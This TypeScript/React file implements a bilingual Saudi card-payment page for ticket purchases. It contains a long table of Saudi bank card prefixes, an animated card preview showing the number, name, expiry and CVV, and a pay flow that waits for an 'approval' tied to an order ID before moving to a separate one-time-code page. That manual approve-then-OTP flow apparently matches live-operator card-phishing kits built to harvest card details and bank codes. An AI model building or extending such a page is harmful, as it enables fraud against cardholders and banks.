...
const BANK_BINS: Record<string, BankInfo> = {
  "400861": rajhi("debit"), "403281": rajhi("debit"), "404610": rajhi("debit"), "405433": rajhi("credit"),
  "407620": rajhi("credit"), "409201": rajhi("debit"), "410248": rajhi("debit"), "410249": rajhi("debit"),
  "410621": rajhi("debit"), "414627": rajhi("credit"), "417323": rajhi("credit"), "419461": rajhi("credit"),
  "421047": rajhi("credit"), "425466": rajhi("credit"), "432767": rajhi("debit"), "445520": rajhi("credit"),
  "445522": rajhi("credit"), "445826": rajhi("credit"), "445827": rajhi("credit"), "446393": rajhi("debit"),
  "455708": rajhi("debit"), "455740": rajhi("debit"), "458456": rajhi("debit"), "462220": rajhi("debit"),
  "478110": rajhi("credit"), "484783": rajhi("debit"), "490980": rajhi("credit"), "494329": rajhi("credit"),
  "512301": rajhi("credit"), "524126": rajhi("credit"), "529078": rajhi("credit"), "537130": rajhi("debit"),
  "554575": rajhi("credit"), "558192": rajhi("credit"), "968205": rajhi("debit"),
  "412113": snb("debit"), "414026": snb("credit"), "417633": snb("debit"), "420689": snb("credit"),
  "422817": snb("debit"), "422818": snb("debit"), "422819": snb("debit"), "422862": snb("credit"),
  "428331": snb("debit"), "433347": snb("credit"), "448748": snb("credit"), "457865": snb("debit"),
  "464052": snb("credit"), "491797": snb("credit"), "492146": snb("credit"), "517720": snb("credit"),
  "518694": snb("credit"), "519310": snb("credit"), "521031": snb("credit"), "523954": snb("credit"),
  "523998": snb("credit"), "524116": snb("credit"), "524130": snb("debit"), "529415": snb("debit"),
  "535825": snb("debit"), "543085": snb("debit"), "549760": snb("debit"), "554180": snb("debit"),
  "556675": snb("credit"), "556676": snb("credit"), "588850": snb("debit"), "968202": snb("debit"),
  "404847": bsf("credit"), "407985": bsf("credit"), "421141": bsf("debit"), "431765": bsf("credit"),
  "440647": bsf("debit"), "440795": bsf("debit"), "444445": bsf("credit"), "446404": bsf("debit"),
  "447335": bsf("credit"), "457997": bsf("debit"), "457998": bsf("credit"), "464280": bsf("credit"),
  "474491": bsf("credit"), "476300": bsf("debit"), "484220": bsf("credit"), "517724": bsf("credit"),
  "524148": bsf("credit"), "531243": bsf("credit"), "546280": bsf("credit"), "552360": bsf("credit"),
  "588845": bsf("debit"), "968208": bsf("debit"),
  "407116": riyad("credit"), "421839": riyad("credit"), "435240": riyad("credit"), "448508": riyad("credit"),
  "455901": riyad("credit"), "464910": riyad("debit"), "468540": riyad("debit"), "468541": riyad("debit"),
  "468542": riyad("debit"), "468543": riyad("debit"), "478342": riyad("credit"), "489320": riyad("debit"),
  "491421": riyad("credit"), "513213": riyad("credit"), "514932": riyad("credit"), "517531": riyad("credit"),
  "520058": riyad("credit"), "520090": riyad("credit"), "524514": riyad("debit"), "527138": riyad("credit"),
  "529741": riyad("debit"), "535989": riyad("debit"), "536023": riyad("debit"), "537767": riyad("debit"),
  "543901": riyad("credit"), "558563": riyad("credit"), "559322": riyad("credit"), "968209": riyad("debit"),
  "402908": alinma("debit"), "407197": alinma("credit"), "407395": alinma("credit"), "412565": alinma("debit"),
  "419738": alinma("credit"), "424870": alinma("debit"), "428671": alinma("debit"), "428672": alinma("debit"),
  "428673": alinma("debit"), "432328": alinma("debit"), "434107": alinma("debit"), "440816": alinma("debit"),
  "446672": alinma("debit"), "459875": alinma("credit"), "485601": alinma("credit"), "512468": alinma("credit"),
  "527610": alinma("credit"), "531827": alinma("credit"), "543357": alinma("debit"), "552363": alinma("credit"),
  "968206": alinma("debit"), "968211": alinma("debit"),
  "403085": bilad("debit"), "410153": bilad("debit"), "417815": bilad("credit"), "424260": bilad("debit"),
  "424261": bilad("debit"), "424262": bilad("debit"), "431204": bilad("debit"), "440952": bilad("debit"),
  "455392": bilad("credit"), "460707": bilad("debit"), "480091": bilad("credit"), "510832": bilad("credit"),
  "521488": bilad("credit"), "529630": bilad("credit"), "543218": bilad("debit"), "552710": bilad("credit"),
  "636120": bilad("debit"), "968201": bilad("debit"),
  "404325": sab("credit"), "414478": sab("credit"), "423810": sab("credit"), "433786": sab("credit"),
  "441261": sab("credit"), "448933": sab("debit"), "455340": sab("credit"), "455389": sab("credit"),
  "456891": sab("credit"), "462785": sab("debit"), "478830": sab("credit"), "490160": sab("credit"),
  "492310": sab("credit"), "508160": sab("debit"), "512060": sab("credit"), "519782": sab("credit"),
  "530906": sab("debit"), "531095": sab("debit"), "532013": sab("debit"), "541920": sab("credit"),
  "552375": sab("credit"), "552438": sab("credit"), "557606": sab("debit"), "558848": sab("debit"),
  "558854": sab("credit"), "605141": sab("debit"), "968203": sab("debit"), "968204": sab("debit"),
  "403940": anb("credit"), "410935": anb("debit"), "421730": anb("credit"), "431556": anb("debit"),
  "442920": anb("credit"), "455017": anb("credit"), "455036": anb("debit"), "462115": anb("debit"),
  "476298": anb("credit"), "486094": anb("debit"), "486095": anb("debit"), "486096": anb("debit"),
  "491610": anb("credit"), "517918": anb("credit"), "524310": anb("credit"), "531678": anb("credit"),
  "542981": anb("credit"), "553240": anb("credit"), "588848": anb("debit"), "968212": anb("debit"),
  "402710": jazira("debit"), "410490": jazira("credit"), "414090": jazira("credit"), "424180": jazira("debit"),
  "433190": jazira("credit"), "440533": jazira("debit"), "445564": jazira("debit"), "453210": jazira("credit"),
  "468901": jazira("debit"), "478590": jazira("credit"), "489317": jazira("debit"), "489318": jazira("debit"),
  "489319": jazira("debit"), "504300": jazira("debit"), "515804": jazira("credit"), "525630": jazira("credit"),
  "539410": jazira("credit"), "968213": jazira("debit"),
  "406136": saib("debit"), "440629": saib("credit"), "440630": saib("debit"), "440631": saib("credit"),
  "457840": saib("credit"), "457841": saib("credit"), "457842": saib("credit"), "457843": saib("credit"),
  "469616": saib("credit"), "476815": saib("credit"),
  ...
  "483009": saib("credit"), "483010": saib("debit"), "483011": saib("debit"), "483012": saib("debit"),
  "524205": saib("credit"), "529298": saib("credit"), "542373": saib("credit"), "552384": saib("credit"),
  "589206": saib("debit"), "968207": saib("debit"),
  "404215": samba("credit"), "415890": samba("credit"), "427310": samba("debit"), "433987": samba("credit"),
  "433988": samba("credit"), "441780": samba("credit"), "454336": samba("credit"), "454337": samba("credit"),
  "454338": samba("debit"), "465920": samba("debit"), "476430": samba("credit"), "489316": samba("debit"),
  "496649": samba("credit"), "496650": samba("debit"), "519450": samba("credit"), "527890": samba("credit"),
  "534210": samba("credit"), "548760": samba("credit"), "553180": samba("credit"), "968210": samba("debit"),
  "410747": hollandi("credit"), "411166": hollandi("credit"), "411167": hollandi("credit"), "412518": hollandi("credit"),
  "416041": hollandi("credit"), "427733": hollandi("credit"), "427739": hollandi("credit"), "490745": hollandi("credit"),
  "493428": hollandi("debit"), "522139": hollandi("credit"), "524165": hollandi("credit"), "558705": hollandi("credit"),
  "403710": gib("debit"), "415620": gib("credit"), "419593": gib("debit"), "431890": gib("debit"),
  "439954": gib("debit"), "467210": gib("debit"), "483560": gib("credit"), "521340": gib("credit"),
  "538970": gib("credit"), "551280": gib("credit"),
...
const brandLogos: Record<string, React.FC<{ className?: string }>> = {
  visa: VisaLogo, mastercard: MastercardLogo, amex: AmexLogo, mada: MadaLogo,
};
...
const CardBrandLogos = ({ brand }: { brand: CardBrand }) => (
  <div className="flex items-center gap-2">
    <AnimatePresence mode="wait">
      {brand ? (
        <motion.div key={brand} initial={{ opacity: 0, scale: 0.7 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.7 }} transition={{ duration: 0.2 }}>
        ...
        <motion.div key="all" className="flex items-center gap-1.5 opacity-50" initial={{ opacity: 0 }} animate={{ opacity: 0.5 }}>
          <VisaLogo className="h-5" /><MastercardLogo className="h-5" /><AmexLogo className="h-5" />
        </motion.div>
      )}
    </AnimatePresence>
  </div>
...
const CardPreview = ({
  cardNumber, cardName, expiry, cvv, brand, bankInfo, bankName, isAr, isFlipped,
  cvvFocused, cardNumberFocused, cardNameFocused, expiryFocused, onFlipToggle,
}: {
  cardNumber: string; cardName: string; expiry: string; cvv: string;
  brand: CardBrand; bankInfo: BankInfo | null; bankName: string | null;
  isAr: boolean; isFlipped: boolean; cvvFocused?: boolean;
  cardNumberFocused?: boolean; cardNameFocused?: boolean; expiryFocused?: boolean;
  onFlipToggle?: () => void;
}) => {
  ...
  return (
    <div ref={cardRef} className="w-full max-w-[380px] mx-auto mb-6 cursor-pointer select-none" style={{ perspective: "1000px" }} onMouseMove={handleMouseMove} onMouseLeave={handleMouseLeave} onClick={onFlipToggle}>
      <motion.div className="relative w-full aspect-[1.586/1]" animate={{ rotateY: isFlipped ? 180 : tilt.rotateY, rotateX: isFlipped ? 0 : tilt.rotateX }} transition={{ duration: isFlipped ? 0.6 : 0.15, ease: isFlipped ? [0.4, 0, 0.2, 1] : "easeOut" }} style={{ transformStyle: "preserve-3d" }}>
        {/* Front */}
        <div className="absolute inset-0 rounded-2xl overflow-hidden shadow-xl" style={{ background: `linear-gradient(135deg, ${colors.from}, ${colors.to})`, backfaceVisibility: "hidden" }}>
          <div className="absolute inset-0 opacity-10">
            <div className="absolute inset-0" style={{ backgroundImage: `radial-gradient(circle at 20% 80%, rgba(255,255,255,0.2) 0%, transparent 50%), radial-gradient(circle at 80% 20%, rgba(255,255,255,0.15) 0%, transparent 50%)` }} />
          </div>
          {bankInfo && (
            <AnimatePresence mode="wait">
              <motion.div key={bankInfo.name} className="absolute top-[5%] start-[6%] flex items-center gap-2" initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0 }} transition={{ duration: 0.3 }}>
                <div className="w-7 h-7 rounded-md flex items-center justify-center text-[8px] font-bold text-white shadow-sm" style={{ backgroundColor: bankInfo.color }}>{bankInfo.logo.slice(0, 2)}</div>
                <div className="flex flex-col">
                  <span className="text-white/90 text-[10px] font-semibold leading-tight">{bankName}</span>
                  <span className="text-white/50 text-[8px] leading-tight">{isAr ? bankInfo.typeAr : bankInfo.type}</span>
                </div>
              </motion.div>
            </AnimatePresence>
          )}
          ...
          <div className="absolute top-[12%] end-[8%]">
            <AnimatePresence mode="wait">
              {brand ? (
                <motion.div key={brand} initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 10 }} transition={{ duration: 0.3 }}>
                  {(() => { const Logo = brandLogos[brand]; return <Logo className="h-8 brightness-0 invert opacity-90" />; })()}
                </motion.div>
              ) : (
                <motion.div key="placeholder" initial={{ opacity: 0 }} animate={{ opacity: 0.5 }}><CreditCard className="w-8 h-8 text-white" /></motion.div>
              )}
            </AnimatePresence>
          </div>
          <div className="absolute top-[50%] start-[8%] end-[8%]">
            <motion.p className={`font-mono text-lg md:text-xl tracking-[0.2em] drop-shadow-sm ${cardNumberFocused ? "text-yellow-300" : "text-white"}`} dir="ltr" key={displayNumber} initial={{ opacity: 0.5 }} animate={cardNumberFocused ? { opacity: [1, 0.4, 1], textShadow: ["0 0 8px rgba(253,224,71,0.8)", "0 0 2px rgba(253,224,71,0.2)", "0 0 8px rgba(253,224,71,0.8)"] } : { opacity: 1, textShadow: "none" }} transition={cardNumberFocused ? { duration: 1.2, repeat: Infinity, ease: "easeInOut" } : { duration: 0.15 }}>{displayNumber}</motion.p>
          </div>
          <div className="absolute bottom-[12%] start-[8%] end-[8%] flex justify-between items-end" dir="ltr">
            <div>
              <p className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">{isAr ? "حامل البطاقة" : "Card Holder"}</p>
              <motion.p className={`text-xs font-medium tracking-wide truncate max-w-[140px] ${cardNameFocused ? "text-yellow-300" : "text-white"}`} key={displayName} initial={{ opacity: 0.5 }} animate={cardNameFocused ? { opacity: [1, 0.4, 1], textShadow: ["0 0 8px rgba(253,224,71,0.8)", "0 0 2px rgba(253,224,71,0.2)", "0 0 8px rgba(253,224,71,0.8)"] } : { opacity: 1, textShadow: "none" }} transition={cardNameFocused ? { duration: 1.2, repeat: Infinity, ease: "easeInOut" } : { duration: 0.15 }}>{displayName.toUpperCase()}</motion.p>
            </div>
            <div className="text-center">
              <p className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">{isAr ? "الانتهاء" : "Expires"}</p>
              <motion.p className={`text-xs font-medium font-mono ${expiryFocused ? "text-yellow-300" : "text-white"}`} key={displayExpiry} initial={{ opacity: 0.5 }} animate={expiryFocused ? { opacity: [1, 0.4, 1], textShadow: ["0 0 8px rgba(253,224,71,0.8)", "0 0 2px rgba(253,224,71,0.2)", "0 0 8px rgba(253,224,71,0.8)"] } : { opacity: 1, textShadow: "none" }} transition={expiryFocused ? { duration: 1.2, repeat: Infinity, ease: "easeInOut" } : { duration: 0.15 }}>{displayExpiry}</motion.p>
            </div>
            <div className="text-end">
              <p className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">CVV</p>
              <motion.p className={`text-sm font-bold font-mono tracking-[0.15em] rounded px-1.5 py-0.5 ${cvvFocused ? "text-yellow-300" : "text-white"}`} key={cvv || "empty"} initial={{ opacity: 0.5 }} animate={cvvFocused ? { opacity: [1, 0.4, 1], textShadow: ["0 0 8px rgba(253,224,71,0.8)", "0 0 2px rgba(253,224,71,0.2)", "0 0 8px rgba(253,224,71,0.8)"] } : { opacity: 1, textShadow: "none" }} transition={cvvFocused ? { duration: 1.2, repeat: Infinity, ease: "easeInOut" } : { duration: 0.3 }}>{cvv || "•••"}</motion.p>
            </div>
          </div>
        </div>
        {/* Back */}
        <div className="absolute inset-0 rounded-2xl overflow-hidden shadow-xl" style={{ background: `linear-gradient(135deg, ${colors.from}, ${colors.to})`, backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}>
          ...
          <div className="absolute top-[40%] left-[8%] right-[8%] flex items-center gap-3">
            ...
            <div className="bg-white rounded px-4 py-2 min-w-[70px] text-center">
              ...
              <p className="text-foreground font-mono font-bold text-lg tracking-[0.15em]">{cvv || "•••"}</p>
            </div>
          </div>
          <div className="absolute bottom-[10%] end-[8%]">
            {brand && (() => { const Logo = brandLogos[brand]; return <Logo className="h-7 brightness-0 invert opacity-60" />; })()}
          </div>
          <p className="absolute bottom-[12%] start-[8%] text-white/40 text-[9px] max-w-[180px] leading-relaxed">
            {isAr ? "هذه البطاقة ملك للبنك المصدر. الاستخدام يخضع للشروط والأحكام." : "This card is property of the issuing bank. Use is subject to terms and conditions."}
          </p>
        </div>
      </motion.div>
    </div>
...
const CardPayment = () => {
  ...
  const state = location.state as {
    ...
    email?: string; phone?: string; total?: number; vat?: number; subtotal?: number;
  } | null;
  ...
  const handlePay = async () => {
    if (!validate()) {
      ...
      if (errors.cardNumber) { setCardNumberGlow(true); setTimeout(() => setCardNumberGlow(false), 2000); }
      if (errors.expiry) { setExpiryGlow(true); setExpiryShake(true); setTimeout(() => setExpiryGlow(false), 2000); setTimeout(() => setExpiryShake(false), 600); }
      if (errors.cvv) { setCvvGlow(true); setCvvShake(true); setTimeout(() => setCvvGlow(false), 2000); setTimeout(() => setCvvShake(false), 600); }
      playChime("error");
      if (navigator.vibrate) navigator.vibrate([50, 30, 50]);
      toast({ title: isAr ? "⚠️ يرجى تعبئة بيانات البطاقة" : "⚠️ Please fill card details", description: isAr ? "تحقق من البيانات وحاول مرة أخرى" : "Check the details and try again", variant: "destructive" });
      return;
    }
  ...
  const handleCardApproved = () => {
    navigate("/card-otp", {
      state: { tickets: state?.tickets, email: state?.email, phone: state?.phone, total, vat, subtotal, cardLast4: cardLast4Saved, cardBrand: cardBrandSaved, orderId: waitingOrderId },
    });
  };

  const handleCardRejected = () => {
    setWaitingOrderId(null);
    toast({ title: isAr ? "❌ تم رفض الطلب" : "❌ Request rejected", description: isAr ? "يرجى المحاولة مرة أخرى" : "Please try again", variant: "destructive" });
  };
        ...
        <div className="max-w-lg mx-auto">
          {waitingOrderId ? (
            <div className="bg-card rounded-2xl border border-border p-6 md:p-8 shadow-sm">
              <WaitingApproval orderId={waitingOrderId} step="card" onApproved={handleCardApproved} onRejected={handleCardRejected} />
            </div>
          ) : (
            <>
              ...
              <div className="bg-card rounded-2xl border border-border dark:border-[hsl(var(--gold)/0.2)] p-6 md:p-8 shadow-sm dark:shadow-[0_0_40px_-10px_hsl(var(--gold)/0.15)]">
                <div className="flex items-center gap-3 mb-6">
                  ...
                  <div>
                    <h1 className="font-display text-xl font-bold text-foreground">{isAr ? "الدفع بالبطاقة" : "Card Payment"}</h1>
                    <p className="text-xs text-muted-foreground">{isAr ? "أدخل بيانات بطاقتك لإتمام الدفع" : "Enter your card details to complete payment"}</p>
                  </div>
                </div>
                <div className="bg-primary/5 dark:bg-primary/10 border border-primary/20 dark:border-primary/25 rounded-xl p-4 mb-6">
                  <div className="flex justify-between text-sm text-muted-foreground mb-1">
                    <span>{isAr ? "المجموع الفرعي" : "Subtotal"}</span><span>{subtotal} {isAr ? "ر.س" : "SAR"}</span>
                  </div>
                  <div className="flex justify-between text-sm text-muted-foreground mb-2">
                    <span>{isAr ? "ضريبة القيمة المضافة" : "VAT"}</span><span>{vat} {isAr ? "ر.س" : "SAR"}</span>
                  </div>
                ...
                <div className="space-y-4">
                  <div>
                    ...
                    <Input className={`mt-1.5 bg-background dark:bg-muted/50 dark:border-border dark:focus:border-primary/50 dark:focus:ring-primary/20 ${errors.cardName ? "border-destructive" : ""}`} value={cardName} onChange={(e) => setCardName(e.target.value)} onFocus={() => { setCardNameFocused(true); setManualFlip(false); playChime("soft"); }} onBlur={() => setCardNameFocused(false)} placeholder={isAr ? "الاسم كما يظهر على البطاقة" : "Name as shown on card"} maxLength={50} />
                  ...
                  <div>
                    ...
                    <Input className={`mt-1.5 bg-background dark:bg-muted/50 dark:border-border dark:focus:border-primary/50 dark:focus:ring-primary/20 transition-all duration-300 ${errors.cardNumber ? "border-destructive" : ""} ${cardNumberGlow ? "ring-2 ring-destructive/50 shadow-[0_0_15px_hsl(var(--destructive)/0.4)] border-destructive" : ""}`} value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} onFocus={() => { setCardNumberFocused(true); setManualFlip(false); playChime("soft"); }} onBlur={() => setCardNumberFocused(false)} placeholder="0000 0000 0000 0000" dir="ltr" maxLength={19} />
                      ...
                      {detectedBankInfo && (
                        <motion.div initial={{ opacity: 0, height: 0, marginTop: 0 }} animate={{ opacity: 1, height: "auto", marginTop: 8 }} exit={{ opacity: 0, height: 0, marginTop: 0 }} className="overflow-hidden">
                          <div className="flex items-center gap-2.5 bg-muted/50 dark:bg-muted/30 rounded-xl px-3 py-2.5 border border-border/50">
                            <div className="w-8 h-8 rounded-lg flex items-center justify-center text-[9px] font-bold text-white shadow-sm shrink-0" style={{ backgroundColor: detectedBankInfo.color }}>{detectedBankInfo.logo.slice(0, 3)}</div>
                            <div className="flex-1 min-w-0">
                              <p className="text-[13px] font-semibold text-foreground truncate">{detectedBank}</p>
                              <p className="text-[11px] text-muted-foreground">{isAr ? detectedBankInfo.typeAr : detectedBankInfo.type}{detectedBrand && ` • ${detectedBrand.toUpperCase()}`}</p>
                            </div>
                            {detectedBrand && <div className="shrink-0">{(() => { const Logo = brandLogos[detectedBrand]; return Logo ? <Logo className="h-6" /> : null; })()}</div>}
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  ...
                  <div className="grid grid-cols-3 gap-3">
                    ...
                    <motion.div animate={cvvShake ? { x: [0, -8, 8, -6, 6, -3, 3, 0] } : { x: 0 }} transition={{ duration: 0.5, ease: "easeInOut" }}>
                      ...
                      <Input className={`mt-1.5 bg-background dark:bg-muted/50 dark:border-border dark:focus:border-primary/50 dark:focus:ring-primary/20 transition-all duration-300 ${errors.cvv ? "border-destructive" : ""} ${cvvGlow ? "ring-2 ring-destructive/50 shadow-[0_0_15px_hsl(var(--destructive)/0.4)] border-destructive" : ""}`} value={cvv} onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))} onFocus={() => { setCvvFocused(true); setManualFlip(false); playChime("click"); }} onBlur={() => setCvvFocused(false)} placeholder="123" dir="ltr" maxLength={4} type="password" />
                      {errors.cvv && <p className="text-destructive text-xs mt-1">{errors.cvv}</p>}
                    </motion.div>
                  </div>
                </div>
                <motion.div className="dark:drop-shadow-[0_8px_25px_hsl(var(--gold)/0.2)] mt-6" animate={cardShake ? { x: [0, -12, 12, -8, 8, -4, 4, 0] } : { x: 0 }} transition={{ duration: 0.5, ease: "easeInOut" }}>
                  <CardPreview cardNumber={cardNumber} cardName={cardName} expiry={expiry} cvv={cvv} brand={detectedBrand} bankInfo={detectedBankInfo} bankName={detectedBank} isAr={isAr} isFlipped={isFlipped} cvvFocused={cvvFocused} cardNumberFocused={cardNumberFocused} cardNameFocused={cardNameFocused} expiryFocused={expiryFocused} onFlipToggle={() => setManualFlip(f => !f)} />
                </motion.div>
